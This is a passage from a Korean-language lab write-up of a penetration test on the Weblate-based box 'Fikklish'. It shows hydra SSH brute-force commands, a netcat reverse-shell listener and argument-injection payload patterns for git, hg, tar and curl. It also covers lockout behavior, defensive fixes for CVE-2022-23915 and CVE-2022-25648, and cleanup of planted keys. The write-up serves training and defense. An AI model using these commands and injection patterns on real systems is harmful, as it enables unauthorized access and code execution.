    failures = AuditLog.objects.get_after(self.user, "login", "failed-auth")
    if failures.count() >= settings.AUTH_LOCK_ATTEMPTS:
        self.user.set_unusable_password()
```
출처: `weblate/accounts/models.py` (weblate-4.11 태그)

**마지막 로그인 이후 실패 10회면 admin 의 비밀번호가 무효화된다.** 레이트리밋에 막힌 시도는 `authenticate()` 에 도달하지 않아 계산에 안 들어가지만, 실제로 뚫고 들어간 실패는 그때까지 5회를 썼다. 남은 예산이 5회라는 걸 알고 나서야 브루트포스를 접고 "어느 단어 하나를 고를 것인가" 로 문제를 바꿨다. **웹 폼에 cewl 348 단어를 먹이는 건 애초에 불가능한 계획이었다** — 5회/5분이면 6시간이고, 그 전에 계정이 죽는다. SSH 로 우회해 실제로 먹여본 결과는 6-2 에 있다.

여섯 번째 시도로 `Niffenegger` 를 쳤다가 틀렸고(대소문자), 일곱 번째 `niffenegger` 가 맞았다. 잠금까지 4회를 남기고 끝났다.

### 6-2. 레이트리밋을 기다리는 동안 SSH 브루트포스를 돌렸다 (2회, 전부 실패)

웹 로그인이 잠긴 동안 놀리기 아까워서 22번을 두드렸다. 계정 목록은 아직 tom 을 모를 때라 짐작으로 넣었다(`users.txt` — `tom admin weblate root`. 결과적으로 tom 은 맞았다).

```
ssh kali@10.44.44.128 "cd ~/PG/Fikklish && hydra -L users.txt -P pw_theme.txt -t 4 -o hydra_theme.log ssh://192.168.248.19"
```
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 124 login tries (l:4/p:31), ~31 tries per task
[STATUS] 60.00 tries/min, 60 tries in 00:01h, 64 to do in 00:02h, 4 active
1 of 1 target completed, 0 valid password found
```
출처: `~/PG/Fikklish/try1_hydra_theme.log`

두 번째는 cewl 사전을 통째로 밀어넣었다.

```
ssh kali@10.44.44.128 "cd ~/PG/Fikklish && hydra -L users.txt -P cewl.txt -t 4 -o hydra_cewl.log ssh://192.168.248.19"
```
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1392 login tries (l:4/p:348), ~348 tries per task
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 1328 to do in 00:21h, 4 active
```
출처: `~/PG/Fikklish/try2_hydra_cewl.log` (완주 기록이 없다 — 로그인이 먼저 뚫려 중단했다)

건질 것 셋.

- **`~21시간`이 아니라 `00:21h`** 다. 21분. 그런데도 이건 손절 신호다 — 4계정 × 348단어를 22번에 던지는 동안 웹 쪽 힌트 하나 확인이 더 빨랐다.
- **`cewl -c` 로 만든 파일은 `-P` 에 바로 못 넣는다.** 파일이 `Niffenegger, 4` 형식이라 hydra 는 쉼표와 숫자까지 붙은 문자열을 시험한다. 실제로 이 실행은 정답 `niffenegger` 를 **사전에 갖고도 못 맞혔다.** 빈도가 필요하면 `-c` 로 뽑아 눈으로 보고, 먹일 파일은 `-c` 없이 따로 만든다.
- 첫 실행에 `-f` 를 붙였다가 지웠는데, 그 사이 `hydra.restore` 가 남아 다음 실행이 **"10초 안에 중단하라"며 10초를 세운다.** 자동화 안에서는 `-I` 를 붙여 그 대기를 없앤다.

### 6-3. 가입 확인 메일을 가로채려다 27분 (완전한 헛다리)

`REGISTRATION_OPEN=True` 에 `EMAIL_HOST=localhost:25` 를 보고 "메일 주소를 우리 Kali 로 지정하면 활성화 링크가 온다" 는 그림을 그렸다. 25번 SMTP 캐처를 파이썬으로 짜서(`smtpcatch.py`) tmux 로 띄우고 `swaks` 로 자체 시험을 먼저 통과시켰다.

```
=== conn from 192.168.45.207 at 2026-08-20 18:48:50.291720 ===
C: EHLO kali
C: MAIL FROM:<noreply@example.com>
C: RCPT TO:<test@[192.168.45.207]>
C: DATA
```
출처: `~/PG/Fikklish/smtp_capture.log` — **이 파일에 남은 연결은 이 자체시험 한 건이 전부다.** 캐처는 멀쩡했고 타겟이 오지 않은 것이다.

주소를 바꿔가며 가입을 반복했다.

- `@192.168.45.207` — Weblate 는 받아주지만 MTA 가 숫자 도메인을 호스트명으로 DNS 조회해 실패한다.
- `catchx@[192.168.45.207]` — Django `EmailValidator` 가 도메인 리터럴을 허용해 통과. 가입 성공(`/accounts/email-sent/`). **그래도 아무것도 안 왔다.**
- `@192.168.45.207.nip.io`, `@192-168-45-207.sslip.io` — 공개 와일드카드 DNS 로 이름 해석 문제를 우회. **역시 무응답.**

`tcpdump -i tun0 host 192.168.248.19 and not tcp port 8000 and not tcp port 80` 를 걸어두고 봤는데 **타겟에서 25번으로 들어온 연결이 하나도 없었다.** 나중에 저장된 캡처(`reg_smtp.pcap`, 19:04~19:32)를 다시 세어봐도 `tcp port 25` 는 **0패킷**이고, 그 필터에 걸린 4139패킷은 전부 6-2 의 hydra SSH·ICMP 확인·443 리버스셸이다. 즉 타겟은 우리 쪽으로 **메일만 안 보낸 게 아니라 SMTP 자체를 시도하지 않았다.**

root 를 잡고 나서야 원인이 확정됐다(`harvest_root.txt`):

- `ps` 어디에도 **celery 워커가 없다.** 프로세스 목록에서 `celery` 는 0건이고, weblate 로 도는 것은 `runserver` 부모(PID 900)와 자식(PID 16427) 둘뿐이다. Weblate 4.11 의 가입 메일은 `send_mails.delay(...)` 로 celery 큐에 들어가므로, 워커가 없으면 큐에 쌓이고 끝이다.
- `ss -lntup` 의 LISTEN 목록에 **25번이 없다.** 떠 있는 건 8000(weblate)·6379(redis)·80(apache)·53(resolved)·22(sshd)·5432(postgres) 뿐이다. `exim4` 패키지는 설치돼 있지만(`exim4 4.95-4ubuntu2.6`, `/usr/sbin/exim4` 존재) 데몬이 안 뜬다. 워커가 있었어도 `EMAIL_HOST=localhost:25` 는 연결 거부였다.

같은 원인이 정리 단계에서도 한 번 더 나왔다 — Weblate UI 로 프로젝트를 지우면 `project_removal.delay()` 라 **삭제도 실행되지 않는다.** 결국 Django ORM 으로 직접 지웠다.

교훈: **가입 폼이 "메일을 보냈습니다" 라고 말한다고 메일이 나간 것이 아니다.** 비동기 큐를 쓰는 앱에서 성공 화면은 "태스크를 넣었다" 는 뜻일 뿐이다. 27분을 태우기 전에 "밖으로 나가는 패킷이 하나도 없다" 를 5분 안에 손절 신호로 읽었어야 했다.

### 6-4. captcha 파싱 (약 8분)

가입 폼의 captcha 는 `What is 15 <svg>…</svg> 8?` 형태로 **연산자가 SVG 아이콘**이다. 처음에 정규식으로 숫자를 다 긁었더니 SVG path 안의 좌표 숫자까지 딸려와 계속 틀렸다. path 의 `d` 속성으로 판정해야 한다.

| path 시작 | 연산 |
|---|---|
| `M19,13H5V11H19V13Z` | 빼기 |
| `M19,6.41L17.59,5L12,10.59...` (X 아이콘) | 곱하기 |
| 그 외 | 더하기 |

곱하기가 있다는 걸 몰라서 한 번 더 틀렸다. 결과적으로 이 작업 전체가 6-2 의 헛다리였지만, 파싱 자체는 재사용 가능한 조각이다(`/tmp/reg2.py`).

### 6-5. 리스너를 다른 박스와 공유했다 (약 6분)

첫 리버스셸 리스너를 `sudo rlwrap nc -lvnp 443 | tee ...` 로 띄웠는데 두 가지가 겹쳤다.

- 다른 세션의 **PwnLab 리스너가 이미 443 을 잡고 있었다.** `ss -lntp` 로 PID 를 특정해 보니 1시간 45분째 살아 있는 남의 프로세스였다. `pkill` 을 쓰면 그쪽 작업까지 죽는다 — **내 PID 만 골라서 `kill -9`** 했다.
- `| tee` 로 파이프한 탓에 nc 의 출력이 블록 버퍼링돼 `tmux capture-pane` 에 아무것도 안 보였다. 셸은 붙었는데 붙은 줄 몰랐다. **리스너는 파이프 없이 띄우고, 기록이 필요하면 `tmux pipe-pane` 이나 로그를 따로 잡아라.**

### 6-6. 그 밖에

- 첫 `gobuster` 는 `/usr/share/seclists/...` 경로가 없어 0초에 죽었다. tmux 안에서 돌리면 실패가 조용하다 — `capture-pane` 으로 확인하기 전까지 몰랐다.
- `~` 확장 문제(3-4). 웹 프로세스에서 딴 셸의 `HOME` 은 그 서비스가 정한 값이지 사용자 홈이 아니다.
- 공개 익스플로잇을 찾을 때 `searchsploit weblate` 는 **0건**이었다(`ruby-git` 도 0건. 감사 때 Kali 에서 다시 확인했다). CVE 번호는 웹 검색으로만 나왔다. **searchsploit 가 비었다고 익스플로잇이 없는 게 아니다** — exploit-db 에 올라오지 않은 CVE 가 훨씬 많다.

## 7. OSCP 시험 관점

1. **레이트리밋이 보이면 브루트포스는 그 자리에서 접는다.** "Too many attempts" 를 본 순간 남은 길은 ① 힌트로 후보를 3~5개로 줄이거나 ② 다른 진입점을 찾는 것 둘뿐이다. 시험에서 한 계정에 30분을 태우면 그 박스는 포기한 것과 같다.
2. **계정 잠금은 되돌릴 수 없는 사고다.** Weblate 처럼 실패 N회에 비번을 무효화하는 앱이 있다. 실재 계정으로 시험하기 전에 **없는 계정으로 정책을 먼저 떠보는** 것이 안전하다.
3. **웹 본문의 손댄 문단은 전부 자격증명 힌트로 취급한다.** 템플릿 사이트라면 원본 템플릿을 내려받아 본문을 대조하는 것이 가장 확실하다. `Last-Modified` 비교도 같이 쓸 만하지만, 이 박스에서는 실제로 하지 않았다(1장).
4. **수동 대안** — cewl 없이도 같은 결과를 얻을 수 있다. 페이지를 눈으로 읽고 고유명사만 적으면 된다. 오히려 그게 이 박스의 정답이었다. 자동 도구를 쓰든 안 쓰든 판단은 사람이 한다.
   그리고 **`cewl -c` 로 만든 파일을 그대로 `-P` 에 넣지 마라.** `Niffenegger, 4` 형식이라 정답을 갖고도 못 맞힌다. 빈도는 눈으로 보고, 먹일 사전은 `-c` 없이 따로 뽑는다(6-2).
5. **인자 주입 반사** — 웹 폼의 값이 CLI 로 흘러가는 자리(저장소 URL, 브랜치, 파일명, 호스트명)를 보면 `-` 로 시작하는 값을 한 번 넣어본다. git 은 `fetch --upload-pack=<cmd>`·`push --exec=<cmd>`, hg 는 `--config=alias.X=!<cmd>`, tar 는 `--checkpoint-action=exec=<cmd>`, curl 은 `-o <파일>` 이 대표적이다. git 의 `--upload-pack` 은 **타겟 없이 로컬에서 재현해 확인했다**(4장).
6. **`sudo -l` 이 스크립트를 가리키면 의존 라이브러리 버전까지 본다.** 스크립트 본문이 깨끗해도 gem/pip 패키지가 뚫려 있으면 끝이다. `gem list` · `pip list` · `npm ls` 를 습관으로.
7. **`.bash_history` 가 `/dev/null` 이어도 다른 히스토리를 본다.** `.psql_history` · `.mysql_history` · `.rediscli_history` · `.python_history` · `.viminfo` · `.lesshst`. 이 박스는 정확히 그 틈에 비번을 뒀다.
8. **`sudo -n -l` 이 "password required" 라고 끝이 아니다.** 비번을 얻은 뒤 반드시 다시 물어라. harvest 를 두 번(비번 전/후) 돌리는 이유다.
9. **RCE 확인은 ICMP 로 먼저.** 리버스셸을 바로 던지면 "실행 실패" 와 "아웃바운드 차단" 이 구별되지 않는다. `ping` 한 줄이면 두 층을 분리할 수 있다.
10. **`id` 는 uid 만 보지 말고 `groups=` 를 끝까지 읽는다.** 이 박스의 tom 은 `110(lxd)` 였다 — `sudo` 가 안 열렸으면 그쪽이 다음 경로였다. `lxd`·`docker`·`disk`·`shadow`·`adm` 은 각각 별개의 길이고, 셸을 잡은 첫 30초에 공짜로 보이는 정보다(4장).
11. **비동기 큐를 쓰는 앱에서 "보냈습니다" 는 "큐에 넣었다" 는 뜻이다.** 메일·알림·삭제가 전부 워커에 달려 있으면 워커가 죽은 순간 UI 는 성공을 말하면서 아무 일도 안 한다. 이 박스는 그 때문에 **가입 메일도, 프로젝트 삭제도** 안 됐다.
12. **시간 배분** — 이 박스의 손절 지점은 명확하다. **메일 가로채기에서 아웃바운드 패킷이 0이면 5분 안에 접는다.** 나는 27분을 썼다. 반대로 로그인만 되면 이후는 9분짜리다.

## 8. 방어 관점

- **Weblate 4.11.1 이상으로 올린다**(CVE-2022-23915). 일반화하면, 사용자 값을 CLI 인자로 넘기는 자리는 `--` 로 옵션 파싱을 끊거나 `-` 로 시작하는 값을 거절해야 한다.
- **ruby-git 을 1.11.0 이상으로 올린다**(CVE-2022-25648).
- `DEBUG=False`. 이 박스에서 DEBUG 는 OS 사용자명·설치 경로·인프라 구성을 통째로 넘겼다. 운영에서 개발 서버(`runserver`)를 그대로 노출하지 않는 것도 같은 이야기다.
- **공개 웹사이트 본문을 비밀번호 소재로 쓰지 않는다.** 사전 공격의 사전을 공격자에게 배포하는 셈이다.
- **DB 비밀번호를 시스템 계정 비밀번호로 재사용하지 않는다.** 그리고 `psql` 은 `\password` 를 쓰면 히스토리에 평문이 남지 않는다.
- `sudo` 로 허용하는 스크립트는 **인자·표준입력을 스스로 검증**해야 한다. `Git.init('/root/projects/' + name)` 처럼 사용자 입력을 경로에 붙이는 것도 별개의 문제다.

## 9. 참고 자료

- CVE-2022-23915 — Weblate < 4.11.1, git/mercurial 인자 주입 RCE. [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088) · [NVD](https://nvd.nist.gov/vuln/detail/cve-2022-23915) · 수정 PR [WeblateOrg/weblate#7337](https://github.com/WeblateOrg/weblate/pull/7337)
- CVE-2022-25648 — ruby-git < 1.11.0 인자 주입. [Snyk](https://security.snyk.io/vuln/SNYK-RUBY-GIT-2421270)
- 소스 대조는 `weblate-4.11` 태그를 기준으로 했다 — 예: `https://raw.githubusercontent.com/WeblateOrg/weblate/weblate-4.11/weblate/accounts/models.py`. 현행 브랜치를 보면 이미 고쳐진 코드가 렌더돼 오독한다.

## 남긴 흔적

**타겟에서 되돌린 것** (root 로 확인, `traces_confirmed.log`)

| 남긴 것 | 처리 |
|---|---|
| Weblate 프로젝트 `poc` + 컴포넌트 5개 | ORM 으로 삭제(celery 부재로 UI 삭제가 동작하지 않음). `/api/projects/` `count:0` 복귀 확인 |
| `/home/tom/.local/.../data/vcs/poc`, `.../vcs/project` | 삭제 (둘 다 우리가 만든 것, mtime 확인) |
| `/home/tom/.ssh/` (우리가 생성) | 디렉터리째 삭제 |
| `/root/.ssh/authorized_keys` | 삭제. 원래 우리 키 한 줄뿐이었음을 `cat` 으로 확인한 뒤 지웠다 |
| `/root/projects/` (익스플로잇이 생성) | 삭제 |
| `/tmp/r.sh` `/tmp/whoami_check` `/tmp/trysudo.sh` `/tmp/harvest.sh` `/tmp/privesc.sh` `/tmp/.h/` | 삭제 |
| `/root/h.sh` `/root/traces.sh` `/root/cleanup.sh` | 삭제 |

**지우지 않고 그대로 둔 것**

- `/var/log/auth.log` — 삭제가 더 큰 흔적이라 손대지 않았다. `sudo` 항목은 실행 명령을 **`COMMAND=` 에 전문으로 박는다.**

  ```
  Aug 20 10:28:25 fikklish sudo:      tom : PWD=/home/tom ; USER=root ; COMMAND=/home/tom/fetch.rb
  Aug 20 10:29:04 fikklish sudo:      tom : a password is required ; PWD=/home/tom ; USER=root ; COMMAND=list
  ```

  두 번째 줄이 `sudo -n -l` 이 실패한 순간이다 — **정찰용 명령까지 이름이 박힌다.**
- `/var/log/btmp` — 키를 심기 전 실패한 SSH 시도 10건이 `tom ssh:notty 192.168.45.207` 로 남았다(6-2 의 hydra 포함).
- `/var/log/wtmp` — `last` 에 남은 우리 세션은 **정확히 두 건**이다.

  ```
  root     pts/0        192.168.45.207   Thu Aug 20 10:28 - 10:28  (00:00)
  tom      pts/0        192.168.45.207   Thu Aug 20 10:26 - 10:26  (00:00)
  ```

  플래그를 채증한 `ssh -tt` 두 번이 그것이고, 그 외 수십 번의 `ssh host 'cmd'` 는 **pty 를 안 열어 wtmp 에 한 줄도 안 남았다.** 같은 작업이 `auth.log` 에는 전부 남아 있다. **어느 로그를 보느냐로 결론이 완전히 갈린다** — 방어 쪽에서 `last` 만 보고 "아무도 안 들어왔다"고 결론내면 그게 이 차이다.

출처: `~/PG/Fikklish/traces_confirmed.log` (root 로 수집)

흔적을 확인하는 작업 자체가 로그를 늘린다. 위 auth.log 발췌의 뒷부분이 전부 **정리·확인하러 다시 들어간 root SSH 세션**이다. 정리는 한 번에 끝내는 게 흔적도 적다.
- Weblate 저널(`journalctl -u weblate`) — 우리 요청과 트레이스백이 남아 있다.
- 가입 시도로 만들어진 `social_django_code` 레코드 — 계정은 생성되지 않았다(`/api/users/` 는 `anonymous`·`admin` 2건 그대로).

**확인하지 않은 것** — PostgreSQL 서버 로그, redis 의 레이트리밋 키 잔존 여부, Apache access_log.

**Kali 쪽** — tmux 세션 `fik_*` 8개 종료, 25번 SMTP 캐처와 tcpdump 를 PID 지정으로 종료, 리스너 없음 확인. 다른 세션 소유의 `pwnlab_shell` 과 443/80 리스너는 손대지 않았다.

## 관련 노트

- [[Bratarina]] · [[ClamAV]] — 서비스 파라미터가 그대로 명령이 되는 유형
- [[RubyDome]] · [[Pelican]] — `sudo` 로 허용된 스크립트가 취약한 유형
- [[Cockpit]] · [[LazySysAdmin]] — 웹/공유 자료에서 얻은 자격증명 재사용
- [[Crane]] · [[Squid]] — "응답이 성공을 뜻하지 않는다" 계열. 이 박스는 반대로 **"응답이 실패라고 익스플로잇이 실패한 것도 아니다"** 쪽 사례다
- [[_STATUS]]
